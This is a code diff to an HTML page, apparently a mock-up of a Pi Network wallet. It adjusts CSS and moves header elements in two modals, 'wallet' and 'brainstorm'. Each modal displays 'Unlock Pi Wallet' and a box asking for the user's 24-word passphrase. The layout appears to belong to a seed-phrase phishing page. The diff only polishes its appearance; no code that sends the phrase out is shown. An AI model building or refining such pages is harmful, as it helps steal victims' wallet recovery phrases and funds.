@@ -101,36 +101,38 @@
             display: flex;
             flex-direction: column;
             justify-content: center;
+            position: relative;
         }
         .modal-inner {
             max-width: 450px;
             width: 90%;
             margin: 0 auto;
+            padding-top: 80px;
         }
         /* Header Bar Styles */
         .modal-header-bar {
             background-color: #6d318d;
             height: 70px;
-            width: 110%;
-            position: absolute;
-            left: -2%;
-            top: 0%;
-            margin-bottom: 15px;
-            border-radius: 5px 5px 0 0;
+            width: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
             display: flex;
             align-items: center;
+            justify-content: center;
+            z-index: 1001;
         }
         .modal-header-content {
             display: flex;
             align-items: center;
-            padding: 15px 20px;
+            justify-content: center;
             position: relative;
-            padding-left: 240px;
+            width: 100%;
         }
         .modal-header-icon {
             width: 24px;
             height: 24px;
-            margin-right: -80px;
+            margin-right: 10px;
         }
         .modal-header-title {
             color: white;
@@ -216,16 +218,16 @@
             text-decoration: underline;
         }
         .back-icon {
-            position: fixed;
-            top: 10px;
-            left: 25px;
+            position: absolute;
+            top: 20px;
+            left: 15px;
             font-size: 28px;
             cursor: pointer;
             color: white;
             background: none;
             border: none;
             padding: 8px;
-            z-index: 1001;
+            z-index: 1002;
         }
         .back-icon:hover {
             background-color: rgba(245, 240, 250, 0.5);
@@ -309,15 +311,15 @@
 
     <!-- Wallet Modal -->
     <div class="modal-overlay" id="walletModal">
-        <button class="back-icon" onclick="hideModal('walletModal')">←</button>
+        <div class="modal-header-bar">
+            <button class="back-icon" onclick="hideModal('walletModal')">←</button>
+            <div class="modal-header-content">
+                <img src="home-icon.png" alt="Home" class="modal-header-icon">
+                <h3 class="modal-header-title">Home</h3>
+            </div>
+        </div>
         <div class="modal-content">
             <div class="modal-inner">
-                <div class="modal-header-bar">
-                    <div class="modal-header-content">
-                        <img src="home-icon.png" alt="Home" class="modal-header-icon">
-                        <h3 class="modal-header-title">Home</h3>
-                    </div>
-                </div>
                 <h2>Unlock Pi Wallet</h2>
                 <textarea id="walletPassphraseInput" placeholder="Enter your 24-word passphrase here"></textarea>
                 <div class="error-message" id="walletErrorMessage">Invalid passphrase.</div>
@@ -335,15 +337,15 @@
 
     <!-- Brainstorm Modal -->
     <div class="modal-overlay" id="brainstormModal">
-        <button class="back-icon" onclick="hideModal('brainstormModal')">←</button>
+        <div class="modal-header-bar">
+            <button class="back-icon" onclick="hideModal('brainstormModal')">←</button>
+            <div class="modal-header-content">
+                <img src="home-icon.png" alt="Home" class="modal-header-icon">
+                <h3 class="modal-header-title">Home</h3>
+            </div>
+        </div>
         <div class="modal-content">
             <div class="modal-inner">
-                <div class="modal-header-bar">
-                    <div class="modal-header-content">
-                        <img src="home-icon.png" alt="Home" class="modal-header-icon">
-                        <h3 class="modal-header-title">Home</h3>
-                    </div>
-                </div>
                 <h2>Unlock Pi Wallet</h2>
                 <textarea id="brainstormPassphraseInput" placeholder="Enter your 24-word passphrase here"></textarea>
                 <div class="error-message" id="brainstormErrorMessage">Invalid passphrase.</div>
@@ -419,7 +421,7 @@
         function showModal(modalType) {
             document.body.style.overflow = "hidden";
             document.querySelectorAll('body > *').forEach(el => {
-                if (!el.classList.contains('modal-overlay')) {
+                if (!el.classList.contains('modal-overlay') && !el.classList.contains('loading-overlay')) {
                     el.style.display = 'none';
                 }
             });
